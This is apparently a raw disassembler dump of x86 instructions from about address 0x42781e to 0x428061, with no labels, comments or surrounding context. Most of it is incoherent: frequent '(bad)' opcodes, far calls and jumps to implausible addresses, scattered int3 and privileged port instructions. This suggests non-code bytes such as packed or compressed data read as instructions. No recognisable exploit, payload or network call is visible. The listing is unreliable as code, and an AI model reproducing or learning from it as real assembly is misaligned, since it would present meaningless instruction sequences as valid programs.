  42781e:	xchg   ebx,edi
  427820:	jmp    DWORD PTR [ebp-0xe30100]
  427826:	(bad)  
  427827:	jmp    FWORD PTR [esi-0x1]
  42782a:	sub    edi,DWORD PTR [edx-0x34]
  42782d:	(bad)  
  42782e:	(bad)  
  42782f:	jecxz  0x427831
  427831:	jp     0x427832
  427833:	jmp    DWORD PTR [esi]
  427835:	(bad)  
  427836:	dec    DWORD PTR [ecx-0xb54ffa9]
  42783c:	push   DWORD PTR [eax+0x5c]
  42783f:	test   DWORD PTR [eax],eax
  427841:	call   0xff577845
  427846:	inc    DWORD PTR [eax]
  427848:	mov    cl,0x89
  42784a:	int3   
  42784b:	fadd   DWORD PTR [ebx-0x7c6bb631]
  427851:	sahf   
  427852:	(bad)  
  427853:	inc    DWORD PTR ds:0x9f0089ff
  427859:	mov    edx,ecx
  42785b:	pop    ss
  42785c:	add    bh,cl
  42785e:	mov    ecx,0xff6c0067
  427863:	(bad)  
  427864:	js     0x427866
  427866:	inc    DWORD PTR [eax]
  427868:	cmp    al,0xcc
  42786a:	and    edi,DWORD PTR [ecx+0x0]
  42786d:	xor    ch,BYTE PTR [esi]
  42786f:	xlat   BYTE PTR ds:[ebx]
  427870:	(bad)  
  427871:	jmp    0xf24575
  427876:	add    DWORD PTR [ebx+0x2137ffc7],0xffffff83
  42787d:	mov    cl,0x17
  42787f:	adc    al,0xff
  427881:	xor    eax,0xffd9ff00
  427886:	int3   
  427887:	(bad)  
  427888:	jg     0x427856
  42788a:	push   edi
  42788b:	retf   0xc3ff
  42788e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42788f:	into   
  427890:	add    BYTE PTR [edi],bl
  427892:	(bad)  
  427893:	push   edi
  427895:	add    BYTE PTR [ecx+0x26000283],cl
  42789b:	sbb    al,0x0
  42789d:	addr16 mov ds:0xff92,eax
  4278a1:	cwde   
  4278a2:	add    BYTE PTR [eax],al
  4278a4:	in     eax,dx
  4278a5:	(bad)  
  4278a6:	dec    DWORD PTR [ecx-0x14790057]
  4278ac:	add    BYTE PTR [eax],dh
  4278ae:	push   eax
  4278af:	(bad)  
  4278b0:	dec    DWORD PTR [edi+edi*8]
  4278b3:	add    BYTE PTR [ecx],bh
  4278b5:	mov    DWORD PTR [eax],eax
  4278b7:	add    BYTE PTR [eax-0x1],bh
  4278ba:	dec    edx
  4278bb:	mov    ch,0xcc
  4278bd:	div    BYTE PTR [ecx]
  4278bf:	lds    eax,FWORD PTR [ebx+0xd1]
  4278c5:	int3   
  4278c6:	dec    DWORD PTR [ecx-0x56db009d]
  4278cc:	call   FWORD PTR [esi-0x49]
  4278cf:	dec    eax
  4278d0:	inc    DWORD PTR [edx-0x1]
  4278d3:	mov    ecx,esp
  4278d5:	add    bh,bh
  4278d7:	add    BYTE PTR [edx-0x33f5eb00],bh
  4278dd:	sbb    BYTE PTR [ebx-0x2d],bh
  4278e0:	int3   
  4278e1:	inc    WORD PTR [eax]
  4278e4:	add    BYTE PTR gs:[ebx-0x1300e000],al
  4278eb:	outs   dx,DWORD PTR ds:[esi]
  4278ec:	push   DWORD PTR [ebx]
  4278ee:	pop    ds
  4278ef:	sar    edi,0x1f
  4278f2:	(bad)  
  4278f3:	push   ebp
  4278f5:	add    ah,cl
  4278f7:	mov    DWORD PTR [eax-0xe50c34],ecx
  4278fd:	adc    BYTE PTR [ebp-0x7cffba],dl
  427903:	dec    DWORD PTR [ecx+0x5bff00ff]
  427909:	add    bh,dl
  42790b:	xlat   BYTE PTR ds:[ebx]
  42790c:	push   DWORD PTR [eax+0x67ffd297]
  427912:	add    BYTE PTR [eax],al
  427914:	int3   
  427915:	add    bh,bh
  427917:	adc    DWORD PTR [edx],0x0
  42791a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42791b:	mov    al,BYTE PTR [eax]
  42791d:	xchg   DWORD PTR [eax+eiz*4+0x0],edi
  427921:	mov    esp,0x833affff
  427926:	cmp    edi,0xffffff83
  427929:	add    al,ah
  42792b:	je     0x42792c
  42792d:	or     DWORD PTR [ecx-0x7c9c0013],0xff89b5ff
  427937:	cmp    esp,0x0
  42793a:	and    edi,DWORD PTR [edi]
  42793c:	int3   
  42793d:	mov    edx,DWORD PTR [edx]
  42793f:	(bad)  
  427940:	jmp    FWORD PTR [ecx]
  427942:	add    BYTE PTR [ecx-0x33ff008e],cl
  427948:	push   ds
  427949:	mov    edi,edi
  42794b:	push   eax
  42794c:	sbb    DWORD PTR [edx+edx*1+0x8dffbc],0xffffff83
  427954:	popf   
  427955:	int3   
  427956:	int3   
  427957:	int3   
  427958:	dec    esp
  427959:	call   FWORD PTR [ebx]
  42795b:	mov    eax,0xcd589a83
  427960:	add    BYTE PTR [ecx-0x77],dl
  427963:	add    BYTE PTR [edi-0x1],cl
  427966:	(bad)  
  427967:	(bad)  
  427968:	fild   WORD PTR [eax]
  42796a:	dec    esi
  42796b:	fwait
  42796c:	mov    DWORD PTR [edi+0x66],ecx
  42796f:	push   cs
  427970:	add    ch,bh
  427972:	add    BYTE PTR [eax],al
  427974:	and    eax,0x77ff83ff
  427979:	jmp    FWORD PTR [ebx]
  42797b:	sar    bh,cl
  42797d:	popa   
  42797e:	pop    ds
  42797f:	enter  0xd8ff,0xff
  427983:	add    bh,bl
  427985:	int3   
  427986:	dec    DWORD PTR [ecx-0x16e67cb3]
  42798c:	int3   
  42798d:	mov    esi,esi
  42798f:	mov    WORD PTR [eax],es
  427991:	ins    BYTE PTR es:[edi],dx
  427992:	int3   
  427993:	inc    DWORD PTR [esi-0x59ff0001]
  427999:	add    BYTE PTR [ebp+0x4e],al
  42799c:	int3   
  42799d:	add    al,dl
  42799f:	dec    edi
  4279a0:	add    BYTE PTR [ebp-0xea0001],bh
  4279a6:	mov    DWORD PTR [ebx+0x111bff3d],eax
  4279ac:	call   FWORD PTR [esi+0x20]
  4279af:	jbe    0x427934
  4279b1:	dec    eax
  4279b2:	add    DWORD PTR [ebx-0x337cff43],0xa
  4279b9:	sub    DWORD PTR [ecx+eiz*4-0x1],0x3
  4279be:	cs out dx,al
  4279c0:	add    BYTE PTR [ebp-0x7669ff01],bl
  4279c6:	int3   
  4279c7:	add    BYTE PTR [eax],bh
  4279c9:	add    BYTE PTR [edi],al
  4279cb:	stc    
  4279cc:	add    BYTE PTR [ecx],bh
  4279ce:	test   BYTE PTR ss:[eax],al
  4279d1:	lods   al,BYTE PTR ds:[esi]
  4279d2:	cmp    edi,0x38
  4279d5:	inc    DWORD PTR [ebx+0x35006983]
  4279db:	(bad)  
  4279dc:	jmp    DWORD PTR [edi]
  4279de:	sub    eax,0x688977
  4279e3:	int3   
  4279e4:	fdiv   st(7),st
  4279e6:	inc    DWORD PTR [eax]
  4279e8:	pop    esp
  4279e9:	mov    DWORD PTR [eax-0x16],esp
  4279ec:	inc    DWORD PTR [ecx]
  4279ee:	mov    bh,BYTE PTR [ecx-0xdc00]
  4279f4:	cmp    cl,ah
  4279f6:	add    DWORD PTR [ebx-0x2824ffd3],0x0
  4279fd:	fwait
  4279fe:	jnp    0x427a55
  427a00:	int3   
  427a01:	mov    DWORD PTR [eax],eax
  427a03:	sbb    DWORD PTR [ecx-0x7d],0x0
  427a07:	add    BYTE PTR [ebx-0x4f7601],bh
  427a0d:	push   edi
  427a0e:	jle    0x427a55
  427a10:	cmp    DWORD PTR [edx-0x34],0xffffffff
  427a14:	jns    0x427a15
  427a16:	cmp    edi,0x1b
  427a19:	int3   
  427a1a:	inc    ebx
  427a1b:	adc    ah,cl
  427a1d:	pop    ebp
  427a1e:	jnp    0x427a54
  427a20:	push   DWORD PTR [esi-0x1]
  427a23:	add    BYTE PTR [esp+ecx*8-0xc20034],ch
  427a2a:	das    
  427a2b:	int    0x0
  427a2d:	shl    ch,cl
  427a2f:	mov    BYTE PTR [eax],0xfa
  427a32:	add    BYTE PTR [eax],al
  427a34:	std    
  427a35:	(bad)  
  427a36:	(bad)  
  427a37:	jmp    FWORD PTR [ebp-0xd00901]
  427a3d:	lahf   
  427a3e:	into   
  427a3f:	cmp    bh,0x77
  427a42:	(bad)  
  427a43:	jmp    FWORD PTR ds:0xd8ffcc83
  427a49:	add    BYTE PTR [edx-0x48],bh
  427a4c:	add    bh,ah
  427a4e:	jge    0x4279e9
  427a50:	int3   
  427a51:	and    eax,0x4a8989
  427a56:	cmp    edi,0xffffffa2
  427a59:	jmp    DWORD PTR [edx+0x4d]
  427a5c:	add    BYTE PTR [ecx-0x10],ah
  427a5f:	retf   0xbf83
  427a62:	inc    DWORD PTR [ebx-0x33ff330f]
  427a68:	jb     0x4279f3
  427a6a:	mov    bl,BYTE PTR [eax-0x1]
  427a6d:	mov    ecx,0x6189a944
  427a72:	add    BYTE PTR [ebx-0xd7],al
  427a78:	aam    0x0
  427a7a:	or     al,0x69
  427a7c:	cmp    DWORD PTR [edx+edi*4],0x51
  427a80:	push   DWORD PTR [eax]
  427a82:	add    bh,bh
  427a84:	aam    0x0
  427a86:	cmp    edi,0x4d
  427a89:	add    BYTE PTR [ecx+0x2],dh
  427a8c:	inc    DWORD PTR [edx+ecx*2-0xe27c2e]
  427a93:	jmp    FWORD PTR ds:0x3cff00ff
  427a99:	int3   
  427a9a:	mov    dh,0xd5
  427a9c:	and    esi,0xffffff8c
  427a9f:	pop    edi
  427aa0:	dec    edx
  427aa2:	add    BYTE PTR [eax],al
  427aa4:	pushf  
  427aa5:	add    BYTE PTR [eax],al
  427aa7:	add    BYTE PTR [esi+0x5fc8ff],ah
  427aad:	cmp    eax,0xbacce45f
  427ab2:	inc    DWORD PTR [eax]
  427ab4:	rol    DWORD PTR [eax],0xcc
  427ab7:	call   FWORD PTR [esi-0x26717d]
  427abd:	test   DWORD PTR [ecx],ecx
  427abf:	mov    DWORD PTR [ebx+0x198300ad],0xcdff00ff
  427ac9:	inc    DWORD PTR [eax]
  427acb:	scas   eax,DWORD PTR es:[edi]
  427acc:	call   FWORD PTR [ecx]
  427ace:	mov    WORD PTR ds:0xff006283,gs
  427ad4:	add    BYTE PTR [ebx+0x4c00ff],0xb9
  427adb:	push   cs
  427adc:	int3   
  427add:	pop    ebx
  427ade:	adc    DWORD PTR [edi-0x34],ebp
  427ae1:	sbb    eax,DWORD PTR [eax]
  427ae3:	or     DWORD PTR [eax+eax*1],0xffffffff
  427ae7:	and    ecx,0xffffffff
  427aea:	lods   eax,DWORD PTR ds:[esi]
  427aeb:	mov    ebp,0xa961d000
  427af0:	add    al,dh
  427af2:	(bad)  
  427af3:	jmp    FWORD PTR [edi-0xe33ff7d]
  427af9:	(bad)  
  427afa:	cmp    bh,dl
  427afc:	call   DWORD PTR [esi+0x1b00e4f6]
  427b02:	inc    DWORD PTR [ebx+0xff0092]
  427b08:	xchg   ebx,eax
  427b09:	jmp    DWORD PTR [ecx-0x39bdff4c]
  427b0f:	jmp    DWORD PTR [ecx-0x23ff01]
  427b16:	dec    esp
  427b18:	mov    edi,?
  427b1a:	popf   
  427b1b:	lock call FWORD PTR [ebx]
  427b1e:	mov    ds:0x3a83b8,eax
  427b23:	add    BYTE PTR [ecx-0x1],dh
  427b26:	dec    esp
  427b28:	mov    ds:0xab36ff,eax
  427b2d:	(bad)  
  427b2e:	out    dx,al
  427b2f:	mov    eax,DWORD PTR [eax]
  427b31:	add    ecx,esp
  427b33:	inc    DWORD PTR [ebp+0x6600ffff]
  427b39:	push   DWORD PTR [eax-0x6c3e33e3]
  427b3f:	cmp    edi,0xffffffa9
  427b42:	add    bh,bh
  427b44:	daa    
  427b45:	(bad)  
  427b46:	(bad)  
  427b47:	(bad)  
  427b48:	(bad)  
  427b49:	jmp    FWORD PTR [edx+0x5]
  427b4c:	add    BYTE PTR [edi],cl
  427b4e:	dec    ebp
  427b4f:	jo     0x427b51
  427b51:	xor    eax,0xff87ccff
  427b56:	or     DWORD PTR [ecx+0x132dccae],0x0
  427b5d:	xor    ebx,ebp
  427b5f:	or     eax,0xff00c600
  427b64:	repnz add bh,bh
  427b67:	add    BYTE PTR [edx-0x1],dh
  427b6a:	pop    esp
  427b6b:	sbb    esp,ecx
  427b6d:	inc    esp
  427b6e:	in     al,0xcc
  427b70:	call   FWORD PTR [ecx+0x0]
  427b73:	push   eax
  427b75:	add    bh,bh
  427b77:	cmp    DWORD PTR ds:0xa67dff,0x7a
  427b7e:	mov    ebx,0xff5d83b6
  427b83:	add    BYTE PTR [ebx+0x72898300],ah
  427b89:	mov    DWORD PTR [eax+eax*4-0x471da900],ebp
  427b90:	call   FWORD PTR [ebx+eax*4-0x7cff7e7d]
  427b97:	inc    esp
  427b99:	jmp    DWORD PTR [ebx]
  427b9b:	ss (bad) 
  427b9d:	sti    
  427b9e:	or     ah,cl
  427ba0:	(bad)  
  427ba1:	fcos   
  427ba3:	xor    DWORD PTR ds:0x460000ff,0x0
  427baa:	cwde   
  427bab:	jno    0x427bac
  427bad:	add    eax,0x9883e456
  427bb2:	mov    DWORD PTR [eax],eax
  427bb4:	mov    dl,0xff
  427bb6:	inc    DWORD PTR [eax]
  427bb8:	mov    esi,0xffbd53ff
  427bbd:	and    DWORD PTR [edx-0x335c3308],ebp
  427bc3:	int3   
  427bc4:	mov    edx,0x18cccc00
  427bc9:	int3   
  427bca:	mov    al,0x9d
  427bcc:	add    BYTE PTR ds:0x99ff516a,al
  427bd2:	inc    DWORD PTR [eax]
  427bd4:	add    BYTE PTR [eax],al
  427bd6:	mov    esp,ecx
  427bd8:	jl     0x427bd9
  427bda:	jle    0x427ba7
  427bdc:	(bad)  
  427bdd:	stc    
  427bde:	popa   
  427bdf:	ret    0x6900
  427be2:	add    ah,cl
  427be4:	sub    edi,edi
  427be6:	add    bh,bh
  427be8:	dec    ebp
  427be9:	add    ecx,0x2f
  427bec:	push   ecx
  427bee:	ins    BYTE PTR es:[edi],dx
  427bef:	(bad)  
  427bf0:	inc    DWORD PTR [edx-0x1]
  427bf3:	add    bl,al
  427bf5:	(bad)  
  427bf6:	inc    DWORD PTR [ebx-0x5cfc00ce]
  427bfc:	add    BYTE PTR [eax],dh
  427bfe:	loopne 0x427c65
  427c00:	add    ah,ah
  427c02:	add    ah,cl
  427c04:	mov    dl,0xcc
  427c06:	add    DWORD PTR [eax],0xffffffbd
  427c09:	dec    eax
  427c0b:	or     al,BYTE PTR [eax]
  427c0d:	jmp    0x427bfd
  427c0f:	jb     0x427c10
  427c11:	call   0xffff:0x8363ffff
  427c18:	push   ebp
  427c19:	call   FWORD PTR [ebx+0x1a]
  427c1c:	mov    DWORD PTR [ecx+ebx*2],esp
  427c1f:	ret    
  427c20:	add    BYTE PTR [edx-0xbc0000],al
  427c26:	(bad)  
  427c27:	dec    DWORD PTR [esi]
  427c29:	int3   
  427c2a:	test   cl,0xff
  427c2d:	cmp    eax,0x25ff72fd
  427c32:	add    BYTE PTR [eax],al
  427c34:	out    dx,eax
  427c35:	add    ah,cl
  427c37:	jmp    FWORD PTR [eax-0xf88c01]
  427c3d:	call   0xd442c2ab
  427c42:	add    BYTE PTR [ecx-0x76ffffab],cl
  427c48:	and    eax,DWORD PTR [ebx-0x51003919]
  427c4e:	adc    dl,0xff
  427c51:	test   BYTE PTR [ebx-0xd000],al
  427c57:	add    BYTE PTR [edx],dh
  427c59:	add    BYTE PTR [ebx],bl
  427c5b:	jne    0x427c5d
  427c5d:	xchg   BYTE PTR [edi],dl
  427c5f:	int3   
  427c60:	(bad)  
  427c61:	mov    ebp,0xffec8900
  427c66:	inc    DWORD PTR [ebx-0x1deffa5]
  427c6c:	and    DWORD PTR [ebp+esi*4-0x7cd9ff4d],0x0
  427c74:	mov    DWORD PTR [ebx+0xc28300],eax
  427c7a:	enter  0xcc1f,0x1c
  427c7e:	out    0x95,eax
  427c80:	add    BYTE PTR [esp+ecx*8],ah
  427c83:	call   DWORD PTR [ecx]
  427c85:	(bad)  
  427c86:	inc    DWORD PTR [eax]
  427c88:	in     al,dx
  427c89:	sub    ebx,0xffffffb9
  427c8c:	add    ch,ah
  427c8e:	stc    
  427c8f:	ret    0x1583
  427c92:	inc    DWORD PTR [ebx-0xff3301]
  427c98:	notrack jmp DWORD PTR [ebx+0x76]
  427c9c:	add    BYTE PTR [edi],al
  427c9e:	dec    ebp
  427c9f:	inc    esi
  427ca0:	call   FWORD PTR [edi+edi*8+0x0]
  427ca4:	popa   
  427ca5:	inc    DWORD PTR [eax]
  427ca7:	int3   
  427ca8:	mov    bl,0x0
  427caa:	in     eax,dx
  427cab:	dec    esi
  427cac:	adc    DWORD PTR [eax],0x19
  427caf:	sar    edi,cl
  427cb1:	add    eax,0xff698300
  427cb6:	inc    DWORD PTR [eax]
  427cb8:	stc    
  427cb9:	add    BYTE PTR [edx+0x42],al
  427cbc:	add    al,cl
  427cbe:	sti    
  427cbf:	cmp    ecx,esp
  427cc1:	adc    al,0x83
  427cc3:	mov    DWORD PTR [edi+edi*8-0x7d],ebx
  427cc7:	add    ch,cl
  427cc9:	add    cl,bl
  427ccb:	xor    edi,edi
  427ccd:	int    0xf5
  427ccf:	retf   
  427cd0:	add    ch,bh
  427cd2:	inc    DWORD PTR [eax]
  427cd4:	lea    ecx,[ecx-0xadff7d]
  427cda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427cdb:	and    eax,DWORD PTR [eax]
  427cdd:	cld    
  427cde:	inc    eax
  427cdf:	lds    eax,FWORD PTR [eax]
  427ce1:	or     eax,DWORD PTR [eax]
  427ce3:	add    BYTE PTR [esi],bh
  427ce5:	add    BYTE PTR [eax],al
  427ce7:	add    BYTE PTR [eax],bl
  427ce9:	add    cl,dh
  427ceb:	js     0x427cec
  427ced:	adc    ebx,DWORD PTR [ebx+0x6]
  427cf0:	inc    DWORD PTR [esi-0x1]
  427cf3:	int3   
  427cf4:	or     al,0x89
  427cf6:	inc    DWORD PTR [eax]
  427cf8:	mov    al,BYTE PTR [ebx-0x1effdb7f]
  427cfe:	lds    edi,FWORD PTR [edi+edi*8]
  427d01:	cdq    
  427d02:	(bad)  
  427d03:	jmp    FWORD PTR [ecx]
  427d05:	add    DWORD PTR [ebx+0xa830c00],0xffffff90
  427d0c:	adc    ebp,0x78
  427d0f:	mov    al,BYTE PTR [eax]
  427d11:	fadd   QWORD PTR [eax]
  427d13:	add    BYTE PTR [ecx],dl
  427d15:	inc    DWORD PTR [ebx-0x67765201]
  427d1b:	cmp    bh,0xed
  427d1e:	lods   eax,DWORD PTR ds:[esi]
  427d1f:	adc    bh,bh
  427d21:	mov    edi,edi
  427d23:	call   DWORD PTR [eax-0x1]
  427d26:	add    BYTE PTR [eax],al
  427d28:	cmp    eax,0xff4a1cff
  427d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d2e:	add    DWORD PTR [edx],0xffffffcc
  427d31:	sub    eax,0xffaaffff
  427d36:	dec    DWORD PTR [ecx+0x6facff7a]
  427d3c:	add    al,dh
  427d3e:	sbb    BYTE PTR [edx-0x7c000701],bl
  427d44:	fs or  esp,0xffffff83
  427d48:	mov    BYTE PTR [eax],0xf8
  427d4b:	adc    eax,DWORD PTR [ebx+0xf178ef]
  427d51:	push   edx
  427d52:	inc    DWORD PTR [eax]
  427d54:	aas    
  427d55:	(bad)  
  427d56:	(bad)  
  427d57:	call   FWORD PTR [edx-0xf6b901]
  427d5d:	retf   
  427d5e:	(bad)  
  427d5f:	icebp  
  427d60:	jmp    FWORD PTR [ecx+0x0]
  427d63:	call   esp
  427d65:	add    ah,cl
  427d67:	call   DWORD PTR [edx]
  427d69:	mov    DWORD PTR [edx+0x586cff23],edi
  427d6f:	(bad)  
  427d70:	inc    DWORD PTR [edi]
  427d72:	dec    esp
  427d74:	call   0xe7ff:0x34000000
  427d7b:	cmc    
  427d7c:	cmp    DWORD PTR [edx],0xffffffcb
  427d7f:	scas   eax,DWORD PTR es:[edi]
  427d80:	call   DWORD PTR [esi]
  427d82:	add    BYTE PTR [ecx-0xff44],cl
  427d88:	mov    edi,0xffa371ff
  427d8d:	cmp    DWORD PTR [edx-0x5ffad],ebx
  427d93:	add    BYTE PTR [eax-0x33007c01],dh
  427d99:	dec    ebp
  427d9b:	mov    cl,BYTE PTR [ecx-0x4bb0f2]
  427da1:	ja     0x427da2
  427da3:	(bad)  
  427da4:	clc    
  427da5:	or     esp,0xffffffff
  427da8:	call   0xf48:0xff862c83
  427daf:	xchg   edi,eax
  427db0:	int3   
  427db1:	push   ecx
  427db2:	inc    DWORD PTR [ebx-0x7600ff90]
  427db8:	and    ecx,DWORD PTR [ecx-0x1c00487f]
  427dbe:	jne    0x427d7b
  427dc0:	add    BYTE PTR [edi-0xbaff01],ah
  427dc6:	add    BYTE PTR [eax],al
  427dc8:	mov    ebx,0x8340adff
  427dcd:	mov    bh,0x7e
  427dcf:	adc    eax,0x83ccb7ff
  427dd4:	dec    esp
  427dd5:	add    bh,bh
  427dd7:	mov    DWORD PTR [eax],eax
  427dd9:	dec    DWORD PTR [ebx+0x1637005f]
  427ddf:	xor    eax,0x83ff6f89
  427de4:	jbe    0x427de5
  427de6:	(bad)  
  427de7:	inc    edi
  427de9:	push   esp
  427deb:	(bad)  
  427dec:	call   esi
  427dee:	out    0x36,eax
  427df0:	dec    DWORD PTR [edx-0xbc7c34]
  427df6:	(bad)  
  427df7:	call   DWORD PTR [ecx]
  427df9:	inc    DWORD PTR [eax+ebx*8+0x0]
  427dfd:	mov    ebx,0x4f009393
  427e02:	add    bh,bh
  427e04:	dec    eax
  427e05:	add    bh,bh
  427e07:	(bad)  
  427e08:	cmp    al,0xff
  427e0a:	(bad)  
  427e0b:	ret    0xfc00
  427e0e:	adc    eax,0xff760070
  427e13:	add    ah,cl
  427e15:	add    bh,bh
  427e17:	or     DWORD PTR [edx-0xbd5201],0xa
  427e1e:	cmp    bh,BYTE PTR [eax+eax*1-0x73007cad]
  427e25:	inc    DWORD PTR [eax]
  427e27:	add    BYTE PTR [eax],al
  427e29:	jmp    FWORD PTR [edx+eax*4-0x31e78d00]
  427e30:	jmp    DWORD PTR ds:0xff7e83ff
  427e36:	add    bh,bh
  427e38:	xor    al,BYTE PTR [eax]
  427e3a:	(bad)  
  427e3b:	pop    ds
  427e3c:	or     DWORD PTR [eax+0x57],0xffffffd7
  427e40:	int3   
  427e41:	inc    eax
  427e42:	mov    DWORD PTR [ebx-0xff0085],eax
  427e48:	xchg   ebx,eax
  427e49:	push   DWORD PTR [ebp+0x24acff27]
  427e4f:	loopne 0x427e50
  427e51:	lock add BYTE PTR [ebx-0x33ff007f],al
  427e58:	xchg   ecx,eax
  427e59:	add    BYTE PTR [esi-0x30],dh
  427e5c:	jmp    DWORD PTR [eax+ecx*8-0x7b00c0]
  427e63:	push   DWORD PTR [edi]
  427e65:	(bad)  
  427e66:	dec    DWORD PTR [ecx+0x3731836c]
  427e6c:	call   FWORD PTR [eax-0x57]
  427e6f:	mov    cl,0x0
  427e71:	test   edi,edi
  427e73:	(bad)  
  427e74:	mov    esp,0xc5ffff00
  427e79:	add    BYTE PTR [edi+0x5fcdffc1],bl
  427e7f:	adc    eax,0xff0200
  427e84:	ja     0x427e86
  427e86:	add    bh,bh
  427e88:	dec    eax
  427e89:	mov    DWORD PTR [esi-0x6ff8ffe6],eax
  427e8f:	inc    eax
  427e90:	and    ebx,0xffffffff
  427e93:	(bad)  
  427e94:	mov    esp,0xafffffff
  427e99:	add    cl,bl
  427e9b:	retf   
  427e9c:	add    BYTE PTR [edi],ch
  427e9e:	mov    ebp,0x83cdff12
  427ea3:	add    BYTE PTR [edi+edi*8-0x333d007d],bl
  427eaa:	aad    0xc8
  427eac:	int3   
  427ead:	jno    0x427e46
  427eaf:	daa    
  427eb0:	add    BYTE PTR [ebp-0x77],al
  427eb3:	cmp    DWORD PTR [ebx-0x4f00007d],0xffffffff
  427eba:	xor    DWORD PTR [ebp+0x0],0x83cc40af
  427ec1:	fmulp  st(4),st
  427ec3:	call   FWORD PTR [eax+eax*1+0xa6ff89]
  427eca:	jbe    0x427f0c
  427ecc:	add    BYTE PTR [ecx],ch
  427ece:	jo     0x427ee4
  427ed0:	mov    DWORD PTR [eax-0xe2007d],ebx
  427ed6:	(bad)  
  427ed7:	jmp    FWORD PTR [ecx-0x1]
  427eda:	push   edi
  427edb:	stos   DWORD PTR es:[edi],eax
  427edc:	call   FWORD PTR [edx]
  427ede:	pop    ds
  427edf:	fadd   QWORD PTR [ebx+0x38ffff1a]
  427ee5:	(bad)  
  427ee6:	dec    esp
  427ee8:	sti    
  427ee9:	push   eax
  427eeb:	fild   WORD PTR [ebx-0xd64a2e]
  427ef1:	das    
  427ef2:	add    DWORD PTR [ebx-0x3355],0x10
  427ef9:	(bad)  
  427efa:	cmp    eax,0xcfa2ffa3
  427eff:	in     al,dx
  427f00:	jmp    FWORD PTR [edi]
  427f02:	add    BYTE PTR [eax],al
  427f04:	hlt    
  427f05:	add    DWORD PTR [eax],0xffffffff
  427f08:	dec    esp
  427f09:	int3   
  427f0a:	nop
  427f0b:	fadd   QWORD PTR [eax]
  427f0d:	jg     0x427f65
  427f0f:	mov    ah,0x83
  427f11:	jae    0x427e9c
  427f13:	call   FWORD PTR [ebx+eax*4]
  427f16:	(bad)  
  427f17:	call   DWORD PTR [esi-0x1]
  427f1a:	(bad)  
  427f1b:	xor    eax,DWORD PTR [eax]
  427f1d:	into   
  427f1e:	sub    eax,0x4eff4f
  427f23:	xor    esi,0x0
  427f26:	inc    DWORD PTR [eax]
  427f28:	mov    bh,bh
  427f2a:	(bad)  
  427f2b:	retf   
  427f2c:	mov    edx,ecx
  427f2e:	or     DWORD PTR [edx+0x67ff],eax
  427f34:	addr16 add bh,bh
  427f37:	push   edi
  427f39:	(bad)  
  427f3a:	in     eax,dx
  427f3b:	mov    bh,0xff
  427f3d:	push   ebp
  427f3e:	jo     0x427f03
  427f40:	call   FWORD PTR [ebp-0xb80000]
  427f46:	(bad)  
  427f47:	inc    ebp
  427f49:	dec    DWORD PTR [ecx]
  427f4b:	and    al,BYTE PTR [eax]
  427f4d:	popa   
  427f4e:	adc    esi,DWORD PTR [edi-0xe901]
  427f54:	mov    esp,ecx
  427f56:	dec    esp
  427f58:	idiv   edi
  427f5a:	(bad)  
  427f5b:	fild   WORD PTR [eax]
  427f5d:	rcl    DWORD PTR [eax-0xf37c73],0x83
  427f64:	mov    ebp,0x1700ffff
  427f69:	inc    edx
  427f6b:	sar    edi,0x8b
  427f6e:	daa    
  427f6f:	pop    eax
  427f70:	int3   
  427f71:	add    al,BYTE PTR [eax]
  427f73:	mov    ebx,eax
  427f75:	dec    esp
  427f77:	add    dl,cl
  427f79:	int3   
  427f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f7b:	(bad)  
  427f7d:	imul   eax,DWORD PTR [ecx],0xffeb00a2
  427f83:	push   DWORD PTR [ebx+eax*4+0x0]
  427f87:	mov    ebp,eax
  427f89:	add    BYTE PTR [ebx+0x7fdc8370],bh
  427f8f:	mov    ds:0x9500,al
  427f94:	inc    esp
  427f95:	add    bh,bh
  427f97:	inc    ebx
  427f99:	int3   
  427f9a:	aas    
  427f9b:	inc    ebx
  427f9c:	add    esi,0x43
  427f9f:	ror    ah,0x58
  427fa2:	add    bh,bh
  427fa4:	adc    eax,0x20ff0000
  427fa9:	add    BYTE PTR [ebp+0x56c9cc3c],dl
  427faf:	mov    edi,?
  427fb1:	cmp    eax,0xffcfff00
  427fb6:	inc    DWORD PTR [eax]
  427fb8:	outs   dx,DWORD PTR ds:[esi]
  427fb9:	cmp    DWORD PTR [ebp-0x7cfeffe4],0xfffffff8
  427fc0:	add    cl,dl
  427fc2:	cmp    edi,0xfffffffb
  427fc5:	int3   
  427fc6:	dec    esp
  427fc8:	mov    esi,0xc9ef83
  427fcd:	adc    BYTE PTR [edi-0x2a0012],ch
  427fd3:	cmp    DWORD PTR [edx-0x1],0xffffffff
  427fd7:	sub    DWORD PTR [ecx-0xb3a07d],0xffffffa1
  427fde:	and    edx,DWORD PTR [ecx-0x34]
  427fe1:	or     bh,bh
  427fe3:	push   eax
  427fe5:	mov    esp,ecx
  427fe7:	mov    DWORD PTR [esi],ecx
  427fe9:	add    dh,ah
  427feb:	cmp    edi,edi
  427fed:	dec    esi
  427fee:	xchg   ebp,eax
  427fef:	enter  0x1400,0x0
  427ff3:	sub    DWORD PTR [edi+edi*8-0x77],0xffffffff
  427ff8:	pop    ss
  427ff9:	call   FWORD PTR [esi+0x57b8ff74]
  427fff:	iret   
  428000:	add    BYTE PTR [edi],bh
  428002:	(bad)  
  428003:	inc    DWORD PTR [edx+0x0]
  428006:	inc    DWORD PTR [ebx+0x6b59ff0d]
  42800c:	add    BYTE PTR [ebp-0x7d000713],dl
  428012:	add    bh,bh
  428014:	mov    al,ds:0x47ff0089
  428019:	push   DWORD PTR [eax-0x263eff9c]
  42801f:	arpl   WORD PTR [eax],ax
  428021:	push   edx
  428022:	add    bh,bh
  428024:	imul   ecx,DWORD PTR [ecx-0x650001],0x73
  42802b:	out    0xff,al
  42802d:	je     0x42801e
  42802f:	push   ebx
  428030:	add    bl,bl
  428032:	inc    DWORD PTR [eax]
  428034:	or     eax,DWORD PTR [ebx-0x7cac0001]
  42803a:	mov    esp,cs
  42803c:	jmp    FWORD PTR [ebx-0x3a004c54]
  428042:	dec    esp
  428044:	cmp    ah,cl
  428046:	(bad)  
  428047:	jmp    ebp
  428049:	dec    DWORD PTR [edi+0x7c]
  42804c:	jmp    FWORD PTR [edx-0x67ffede3]
  428052:	int3   
  428053:	add    BYTE PTR [edx+0x75ff83ff],dl
  428059:	add    BYTE PTR [edx+0x1c],cl
  42805c:	call   FWORD PTR [edi]
  42805e:	ret    
  42805f:	hlt    
  428060:	int3   
  428061:	stos   DWORD PTR es:[edi],eax
